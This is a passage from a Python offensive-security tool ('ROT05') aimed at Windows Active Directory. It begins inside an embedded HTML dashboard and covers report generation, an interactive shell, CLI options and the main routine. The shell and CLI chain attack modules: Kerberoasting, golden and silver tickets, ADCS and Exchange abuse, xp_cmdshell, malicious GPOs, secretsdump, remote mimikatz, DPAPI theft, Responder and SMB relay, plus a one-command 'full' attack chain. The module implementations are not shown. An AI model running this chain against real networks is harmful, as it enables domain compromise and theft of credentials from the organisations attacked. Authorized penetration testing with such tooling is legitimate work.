      return d<(b?Math.abs((b.p/65535)*r.width-x):Infinity)?p:b;
    },null);
    if(hit&&Math.abs((hit.p/65535)*r.width-x)<8){
      var cs=(hit.cves||[]).length?' ('+hit.cves.join(', ')+')':'';
      tip.textContent=hit.p+'/'+hit.pr+'  '+(hit.svc||'')+cs;
      tip.style.display='block';tip.style.left=(e.clientX+10)+'px';tip.style.top=(e.clientY-30)+'px';
    }else{tip.style.display='none';}
  });
  c.addEventListener('mouseleave',function(){tip.style.display='none';});
})();

function drawTopo(){
  var svg=document.getElementById('topo');
  var cx=100,cy=60,R=50;
  var nodes=[
    {lbl:'DNS/KRB',a:-90,c:'#00C8FF'},{lbl:'SMB',a:-25,c:'#FF3355'},
    {lbl:'LDAP',a:35,c:'#FFB300'},{lbl:'RDP',a:100,c:'#FF7733'},
    {lbl:'WinRM',a:155,c:'#3399FF'},{lbl:'ADCS',a:-150,c:'#7C5CFC'},
  ];
  var out='<defs><filter id="gl"><feGaussianBlur stdDeviation="2" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>';
  nodes.forEach(function(n){
    var rd=n.a*Math.PI/180,nx=cx+R*Math.cos(rd),ny=cy+R*Math.sin(rd);
    out+='<line x1="'+cx+'" y1="'+cy+'" x2="'+nx+'" y2="'+ny+'" stroke="#1B2038" stroke-width="1.5" stroke-dasharray="3,3"/>';
  });
  out+='<rect x="'+(cx-20)+'" y="'+(cy-15)+'" width="40" height="30" rx="5" fill="#111525" stroke="#00C8FF" stroke-width="1.5" filter="url(#gl)"/>';
  out+='<text x="'+cx+'" y="'+(cy-3)+'" text-anchor="middle" fill="#00C8FF" font-family="Courier New" font-size="9" font-weight="700">DC01</text>';
  out+='<text x="'+cx+'" y="'+(cy+8)+'" text-anchor="middle" fill="#566082" font-family="Courier New" font-size="7.5">'+D.ip+'</text>';
  nodes.forEach(function(n){
    var rd=n.a*Math.PI/180,nx=cx+R*Math.cos(rd),ny=cy+R*Math.sin(rd);
    out+='<circle cx="'+nx+'" cy="'+ny+'" r="15" fill="#0C0F1C" stroke="'+n.c+'" stroke-width="1.3" opacity=".9"/>';
    out+='<text x="'+nx+'" y="'+(ny+3.5)+'" text-anchor="middle" fill="'+n.c+'" font-family="Courier New" font-size="7" font-weight="700">'+n.lbl+'</text>';
  });
  svg.innerHTML=out;
}

(function tick(){
  var now=new Date();
  document.getElementById('clk').textContent=now.toTimeString().slice(0,8);
  document.getElementById('sbr').textContent='ROT05  ·  '+now.toLocaleDateString()+' '+now.toTimeString().slice(0,8);
  setTimeout(tick,1000);
})();

init();renderPorts();renderServices();renderNmap();
renderFinds();renderMitre();renderDet();
drawCanvas();drawTopo();
window.addEventListener('resize',drawCanvas);
</script>
</body>
</html>"""


def generate_dashboard(findings: List[Dict]) -> Path:
    """Generate a standalone interactive HTML dashboard from real scan data."""
    out_path = ensure_dir() / "DASHBOARD.html"
    now      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ── Collect ports from nmap XML or text fallback ─────────────────────
    nmap_dir  = OUTPUT_DIR / "nmap"
    ports: List[Dict] = []
    for xml_name in ("services.xml", "all-ports.xml"):
        xml_path = nmap_dir / xml_name
        if xml_path.exists():
            ports = _parse_nmap_xml(xml_path)
            break
    if not ports:
        for txt_name in ("services.log", "all-ports.log"):
            ports = _parse_nmap_txt(nmap_dir / txt_name)
            if ports:
                break

    # Mark CVEs on port 445
    smb_cves = _detect_cves_from_smb_output()
    for pt in ports:
        if pt["p"] == 445 and smb_cves:
            pt["cves"] = smb_cves

    nmap_raw = _nmap_raw_text()

    # ── Compute risk score ────────────────────────────────────────────────
    crit_c = sum(1 for f in findings if f["severity"].lower() == "critical")
    high_c = sum(1 for f in findings if f["severity"].lower() == "high")
    med_c  = sum(1 for f in findings if f["severity"].lower() == "medium")
    cve_c  = sum(1 for p in ports if p.get("cves"))
    risk_score = min(100, crit_c * 22 + high_c * 12 + med_c * 5 + cve_c * 8)
    risk_label = ("Critical" if risk_score >= 75 else
                  "High"     if risk_score >= 50 else
                  "Medium"   if risk_score >= 25 else "Low")

    # ── Build MITRE ATT&CK tactic map ─────────────────────────────────────
    _TACTIC_ORDER = [
        "Initial Access", "Execution", "Persistence", "Privilege Escalation",
        "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
        "Collection", "Exfiltration", "Impact",
    ]
    _MITRE_BASE: Dict[str, str] = {
        "T1078": "Initial Access",   "T1133": "Initial Access",
        "T1190": "Initial Access",   "T1566": "Initial Access",
        "T1059": "Execution",        "T1203": "Execution",
        "T1098": "Persistence",      "T1136": "Persistence",   "T1547": "Persistence",
        "T1068": "Privilege Escalation", "T1548": "Privilege Escalation",
        "T1649": "Privilege Escalation", "T1134": "Privilege Escalation",
        "T1562": "Defense Evasion", "T1070": "Defense Evasion",
        "T1003": "Credential Access", "T1110": "Credential Access",
        "T1552": "Credential Access", "T1555": "Credential Access",
        "T1557": "Credential Access", "T1558": "Credential Access",
        "T1016": "Discovery",  "T1018": "Discovery",  "T1069": "Discovery",
        "T1087": "Discovery",  "T1135": "Discovery",  "T1482": "Discovery",
        "T1021": "Lateral Movement", "T1210": "Lateral Movement", "T1550": "Lateral Movement",
        "T1039": "Collection", "T1113": "Collection", "T1114": "Collection",
        "T1041": "Exfiltration", "T1048": "Exfiltration",
        "T1486": "Impact",     "T1490": "Impact",     "T1529": "Impact",
    }
    mitre_map: Dict[str, List] = {t: [] for t in _TACTIC_ORDER}
    seen_techs: set = set()
    for f in findings:
        mid = f.get("mitre", "")
        if mid and mid not in seen_techs:
            tactic = _MITRE_BASE.get(mid.split(".")[0], "")
            if tactic:
                mitre_map[tactic].append(mid)
            seen_techs.add(mid)

    # ── Build findings JS array ───────────────────────────────────────────
    findings_js = [
        {
            "id":    f["key"],
            "sev":   f["severity"].lower(),
            "title": f["title"],
            "mitre": f.get("mitre", ""),
            "tac":   _MITRE_BASE.get(f.get("mitre", "").split(".")[0], "—"),
            "desc":  f["description"],
            "ev":    f.get("evidence", "—"),
            "rem":   f["remediation"],
        }
        for f in findings
    ]

    # ── Build data payload ────────────────────────────────────────────────
    data_js = json.dumps({
        "ip":     config.ip or "—",
        "domain": config.domain or "—",
        "user":   config.username or "—",
        "date":   now,
        "output": str(OUTPUT_DIR),
        "risk":   risk_score,
        "rlabel": risk_label,
        "ports":  ports,
        "finds":  findings_js,
        "mitre":  mitre_map,
        "nmap":   nmap_raw,
    }, ensure_ascii=False)

    # ── Render and write ─────────────────────────────────────────────────
    html = _DASH_TPL.replace("/*__DATA__*/", "const D=" + data_js + ";")
    out_path.write_text(html, encoding="utf-8")
    success(f"Dashboard   → {out_path}")
    return out_path


# INTERACTIVE SHELL
# ──────────────────────────────────────────────────────────────────────────────

class ROT05Shell(cmd.Cmd):
    intro  = f"\n{Y}ROT05 Interactive Shell{RST} — type {G}help{RST} for commands\n"
    prompt = f"{B}ROT05>{RST} "

    def __init__(self):
        super().__init__()
        self.modules = {
            "nmap":         lambda: ADEnum.nmap(config.ip),
            "ldap":         ADEnum.ldap,
            "smb":          ADEnum.smb,
            "rpc":          ADEnum.rpc,
            "windapsearch": ADEnum.windapsearch,
            "kerberoast":   KerberosAttacks.kerberoast,
            "asreproast":   KerberosAttacks.asreproast,
            "golden":       KerberosAttacks.golden_ticket,
            "adcs":         ADCSAttacks.enumerate_ca,
            "exch-detect":  ExchangeAttacks.detect_version,
            "privexchange": ExchangeAttacks.privesc,
            "ews":          ExchangeAttacks.ews_abuse,
            "sql-enum":     SQLAttacks.enumerate,
            "sql-cmd":      lambda: SQLAttacks.xp_cmdshell(input("Command: ")),
            "gpo-scan":     GPOAttacks.find_cpassword,
            "gpo-pwn":      GPOAttacks.malicious_gpo,
            "secrets":      CredentialAccess.secretsdump,
            "dpapi":        CredentialAccess.dpapi_backup,
            "mimikatz":     CredentialAccess.mimikatz_remote,
            "responder":    lambda: RelayAttacks.responder(60),
            "relay":        lambda: RelayAttacks.smb_relay("targets.txt"),
            "bloodhound":   lambda: BloodHound.collect("SharpHound.exe"),
            "scan":         CVEScanner.scan,
        }

    def do_set(self, arg):
        """set target|domain|user|pass|hash|ca|exchange|sql|interface <value>"""
        parts = arg.split(maxsplit=1)
        if len(parts) != 2:
            print("Usage: set <option> <value>")
            return
        key, val = parts[0].lower(), parts[1]
        mapping  = {
            "target": "ip", "domain": "domain", "user": "username",
            "pass": "password", "hash": "ntlm_hash", "ca": "ca_server",
            "exchange": "exchange_server", "sql": "sql_server", "interface": "interface",
        }
        if key in mapping:
            setattr(config, mapping[key], val)
            success(f"{key} = {val if key != 'pass' else '***'}")
        else:
            err(f"Unknown option: {key}")

    def do_show(self, _):
        """Display current configuration"""
        print(f"\n{Y}Configuration:{RST}")
        for label, val in [
            ("Target",    config.ip),
            ("Domain",    config.domain),
            ("Username",  config.username),
            ("Password",  "*" * len(config.password) if config.password else ""),
            ("Hash",      config.ntlm_hash[:16] + "…" if config.ntlm_hash else ""),
            ("Interface", config.interface),
            ("Output",    str(config.output_dir)),
        ]:
            print(f"  {label:<12} {val or 'NOT SET'}")

    def do_enum(self, _):
        """Full enumeration (nmap, ldap, smb, rpc)"""
        if not config.ip:
            err("Target not set")
            return
        title("Full Enumeration")
        for svc, up in detect_services(config.ip).items():
            (success if up else debug)(f"{svc} {'detected' if up else 'not detected'}")
        # FIX: use ThreadPoolExecutor for parallel enumeration
        enum_tasks = [ADEnum.ldap, ADEnum.smb, ADEnum.rpc, ADEnum.windapsearch]
        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = {ex.submit(t): t.__name__ for t in enum_tasks}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as exc:
                    warn(f"{futures[fut]} failed: {exc}")
        ADEnum.nmap(config.ip)  # nmap runs sequentially (long, uses -oA)

    def do_full(self, _):
        """Complete attack chain"""
        if not config.ip or not config.has_creds():
            err("Target and credentials required")
            return
        self.do_enum("")
        KerberosAttacks.kerberoast()
        KerberosAttacks.asreproast()
        if config.ca_server or is_port_open(config.ip, 443):
            ADCSAttacks.enumerate_ca()
        if is_port_open(config.ip, 1433):
            SQLAttacks.enumerate()
        CredentialAccess.secretsdump()
        CredentialAccess.dpapi_backup()
        GPOAttacks.find_cpassword()
        success("Full chain complete")

    def do_run(self, arg):
        """run <module>"""
        if not arg:
            print(f"Modules: {', '.join(self.modules)}")
            return
        if arg not in self.modules:
            err(f"Unknown module: {arg}")
            return
        if not config.ip:
            err("Target not set")
            return
        try:
            self.modules[arg]()
        except Exception as exc:
            err(f"Module failed: {exc}")

    def do_report(self, _):
        """Generate report"""
        generate_report()

    def do_shell(self, arg):
        """shell <cmd>  — run system command"""
        if arg:
            stdout, _ = run(arg.split(), shell=False)
            print(stdout)
        else:
            os.system(os.environ.get("SHELL", "/bin/bash"))

    def do_exit(self, _):
        """Exit"""
        print("Goodbye!")
        return True

    def do_help(self, _):
        print(f"""
{Y}Commands:{RST}  set, show, enum, full, run <module>, report, shell <cmd>, exit

{Y}Modules:{RST}
  nmap ldap smb rpc windapsearch
  kerberoast asreproast golden
  adcs exch-detect privexchange ews
  sql-enum sql-cmd
  gpo-scan gpo-pwn
  secrets dpapi mimikatz
  responder relay bloodhound scan
""")

# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="ROT05 Swiss Army Knife — authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 red_offensive_team_05.py                                # interactive
  python3 red_offensive_team_05.py -t 10.10.10.10 --enum
  python3 red_offensive_team_05.py -t DC.htb.local -d htb.local -u user -P --kerberoast
  python3 red_offensive_team_05.py -t 10.10.10.10 -d lab.local -u admin -p Pass --full
  python3 red_offensive_team_05.py -t 10.10.10.10 --scan-cves
  python3 red_offensive_team_05.py -t 10.10.10.10 --enum --force-rerun
""")
    p.add_argument("-t", "--target")
    p.add_argument("-d", "--domain")
    p.add_argument("-u", "--username")
    p.add_argument("-p", "--password")
    p.add_argument("-P", "--prompt-password", action="store_true",
                   help="Prompt for password (keeps it out of shell history)")
    p.add_argument("-H", "--hash",           help="NTLM hash for PTH")
    p.add_argument("--enum",        action="store_true")
    p.add_argument("--full",        action="store_true")
    p.add_argument("--kerberoast",  action="store_true")
    p.add_argument("--asreproast",  action="store_true")
    p.add_argument("--golden",      action="store_true")
    p.add_argument("--silver",      metavar="SPN")
    p.add_argument("--adcs",        action="store_true")
    p.add_argument("--exchange",    action="store_true")
    p.add_argument("--sql",         action="store_true")
    p.add_argument("--secrets",     nargs="?", const="", metavar="USERNAME")
    p.add_argument("--dpapi",       action="store_true")
    p.add_argument("--responder",   type=int, nargs="?", const=60, metavar="SECONDS")
    p.add_argument("--scan-cves",   action="store_true")
    p.add_argument("--bloodhound",  metavar="SHARPHOUND_PATH")
    p.add_argument("--ca-server")
    p.add_argument("--exchange-server")
    p.add_argument("--sql-server")
    p.add_argument("--interface",   default="eth0")
    p.add_argument("-o", "--output", default="rot05_output")
    p.add_argument("--interactive",  action="store_true")
    # FIX: --force-rerun to bypass checkpoints
    p.add_argument("--force-rerun",  action="store_true",
                   help="Re-run phases even if already completed")
    # FIX: --check-window to enforce compliance time window
    p.add_argument("--check-window", action="store_true",
                   help="Enforce authorized hours window before running")
    p.add_argument("--window-start", type=int, default=8,  metavar="HOUR")
    p.add_argument("--window-end",   type=int, default=18, metavar="HOUR")
    # Recommendation 1: config file
    p.add_argument("--config",        metavar="PATH",
                   help="Load persistent settings from JSON config file")
    p.add_argument("--save-config",   action="store_true",
                   help="Save non-sensitive settings to config file then exit")
    # Recommendation 2: result encryption
    p.add_argument("--encrypt-results", action="store_true",
                   help="Encrypt sensitive output dirs after run completes")
    p.add_argument("--passphrase",    metavar="PHRASE",
                   help="Encryption passphrase (prefer --passphrase-file)")
    p.add_argument("--passphrase-file", metavar="FILE",
                   help="Read encryption passphrase from file")
    # Recommendation 3: dry-run
    p.add_argument("--dry-run",       action="store_true",
                   help="Print commands without executing them")
    return p.parse_args()


def _resolve_passphrase(args) -> str:
    """Return encryption passphrase from CLI arg, file, or interactive prompt."""
    if args.passphrase:
        return args.passphrase
    if args.passphrase_file:
        try:
            return Path(args.passphrase_file).read_text().strip()
        except Exception as exc:
            err(f"Cannot read passphrase file: {exc}")
            sys.exit(ExitCode.ENCRYPT_ERROR)
    return getpass("Encryption passphrase: ")


def main():
    args = parse_args()

    # ── Recommendation 3: activate dry-run before any run() call ────────────
    global DRY_RUN
    if args.dry_run:
        DRY_RUN = True
        warn("DRY-RUN mode active — commands will be printed, not executed")

    # ── Recommendation 1: load config file first; CLI args override below ───
    cfg_file: Optional[ConfigFile] = None
    if args.config:
        cfg_path = Path(args.config)
        if not cfg_path.exists():
            err(f"Config file not found: {cfg_path}")
            sys.exit(ExitCode.CONFIG_ERROR)
        cfg_file = ConfigFile(cfg_path)
        cfg_file.apply(config)

    # Populate config (CLI values override any file-loaded values)
    if args.target:          config.ip              = args.target
    if args.domain:          config.domain          = args.domain
    if args.username:        config.username        = args.username
    if args.password:        config.password        = args.password
    if args.hash:            config.ntlm_hash       = args.hash
    if args.ca_server:       config.ca_server       = args.ca_server
    if args.exchange_server: config.exchange_server = args.exchange_server
    if args.sql_server:      config.sql_server      = args.sql_server
    if args.interface:       config.interface       = args.interface
    if args.output:
        config.output_dir = Path(args.output)

    global OUTPUT_DIR
    OUTPUT_DIR = config.output_dir
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    # FIX: logging deferred until output_dir is known
    setup_logging(OUTPUT_DIR)

    # ── Recommendation 1: optionally save config then continue ──────────────
    if args.save_config:
        save_path = Path(args.config) if args.config else OUTPUT_DIR / "rot05_config.json"
        ConfigFile(save_path).save(config)

    if args.prompt_password and not config.password and config.username:
        config.password = getpass(f"Password for {config.username}@{config.domain}: ")

    main_banner()

    # ── Recommendation 6: proper exit codes for compliance failure ───────────
    if args.check_window:
        checker = ComplianceChecker(args.window_start, args.window_end)
        ok, msg = checker.check()
        if not ok:
            err(f"Compliance check failed: {msg}")
            err("Adjust --window-start/--window-end to override.")
            sys.exit(ExitCode.COMPLIANCE_FAIL)
        success(f"Compliance: {msg}")

    if args.interactive or not args.target:
        ROT05Shell().cmdloop()
        return

    info(f"Target:  {config.ip}")
    info(f"Domain:  {config.domain or '(not set)'}")
    info(f"Output:  {OUTPUT_DIR}")

    ckpt  = CheckpointManager(OUTPUT_DIR)
    force = args.force_rerun

    ComplianceChecker.flag_intrusive(
        [k for k, v in vars(args).items() if v is True or (v and k not in
         ("target","domain","username","password","hash","output","interface"))]
    )

    if args.scan_cves:
        _phase("cves", CVEScanner.scan, ckpt, force)

    if args.enum or args.full:
        _phase("nmap",         lambda: ADEnum.nmap(config.ip), ckpt, force)
        # parallel enumeration
        tasks = [ADEnum.ldap, ADEnum.smb, ADEnum.rpc, ADEnum.windapsearch]
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = {ex.submit(lambda fn=t: _phase(fn.__name__, fn, ckpt, force)): t for t in tasks}
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as exc:
                    warn(f"Enumeration task failed: {exc}")

    if args.kerberoast or args.full:
        _phase("kerberoast",  KerberosAttacks.kerberoast,  ckpt, force)
    if args.asreproast or args.full:
        _phase("asreproast",  KerberosAttacks.asreproast,  ckpt, force)
    if args.golden or args.full:
        _phase("golden",      KerberosAttacks.golden_ticket, ckpt, force)
    if args.silver:
        _phase("silver",      lambda: KerberosAttacks.silver_ticket(args.silver), ckpt, force)
    if args.adcs or args.full:
        _phase("adcs",        ADCSAttacks.enumerate_ca,    ckpt, force)
    if args.exchange or args.full:
        _phase("exchange",    ExchangeAttacks.detect_version, ckpt, force)
    if args.sql or args.full:
        _phase("sql",         SQLAttacks.enumerate,         ckpt, force)
    if args.secrets is not None or args.full:
        user = args.secrets if args.secrets else ""
        _phase("secrets",     lambda: CredentialAccess.secretsdump(user), ckpt, force)
    if args.dpapi or args.full:
        _phase("dpapi",       CredentialAccess.dpapi_backup, ckpt, force)
    if args.responder:
        _phase("responder",   lambda: RelayAttacks.responder(args.responder), ckpt, force)
    if args.bloodhound:
        _phase("bloodhound",  lambda: BloodHound.collect(args.bloodhound), ckpt, force)

    generate_report()

    # ── Recommendation 2: encrypt sensitive results ──────────────────────────
    if args.encrypt_results:
        passphrase = _resolve_passphrase(args)
        ResultEncryptor(passphrase, OUTPUT_DIR).encrypt_sensitive(OUTPUT_DIR)

    success(f"Done — results in {OUTPUT_DIR}")
    sys.exit(ExitCode.SUCCESS)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted{RST}")
        sys.exit(0)
    except Exception as exc:
        err(f"Fatal: {exc}")
        logger.critical("Unhandled exception", exc_info=True)
        sys.exit(ExitCode.GENERAL_ERROR)
